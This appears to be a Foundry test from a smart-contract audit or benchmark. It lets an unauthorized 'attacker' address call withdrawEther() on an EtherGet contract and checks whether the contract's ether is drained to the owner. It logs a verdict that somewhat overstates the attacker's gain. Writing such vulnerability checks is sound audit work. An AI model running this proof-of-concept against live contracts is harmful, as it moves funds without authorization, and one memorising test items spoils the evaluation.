// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol";

contract ArbitrarySendTest is Test {
    EtherGet public etherGet;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        etherGet = new EtherGet();
        vm.stopPrank();
    }

    function testArbitraryEtherSend() public {
        // Fund the contract with ether
        uint256 amount = 1 ether;
        deal(address(etherGet), amount);
        address contractAddress = address(etherGet);

        console.log("--- BEFORE-Trigger withdrawEther ---");
        uint256 initialContractBalance = contractAddress.balance;
        uint256 initialOwnerBalance = owner.balance;
        uint256 initialWithdrawals = etherGet.totalWithdrawals();
        console.log("Contract Balance (before):", initialContractBalance);
        console.log("Owner Balance (before):", initialOwnerBalance);
        console.log("Total Withdrawals (before):", initialWithdrawals);

        console.log("--- Trigger withdrawEther ---");
        vm.prank(attacker);
        etherGet.withdrawEther();

        console.log("--- AFTER-Trigger withdrawEther ---");
        uint256 currentContractBalance = contractAddress.balance;
        uint256 currentOwnerBalance = owner.balance;
        uint256 currentWithdrawals = etherGet.totalWithdrawals();
        console.log("Contract Balance (after):", currentContractBalance);
        console.log("Owner Balance (after):", currentOwnerBalance);
        console.log("Total Withdrawals (after):", currentWithdrawals);

        // Critical vulnerability criteria checks
        bool contractDrained = currentContractBalance == 0;
        bool ownerReceivedFunds = currentOwnerBalance == initialOwnerBalance + amount;
        bool withdrawalsIncreased = currentWithdrawals == initialWithdrawals + 1;
        bool vulnerabilityExists = contractDrained && ownerReceivedFunds && withdrawalsIncreased;

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully manipulated contract balance and owner funds");
        } else {
            console.log("Vulnerability not Exist: State changes did not indicate successful exploitation");
        }
    }
}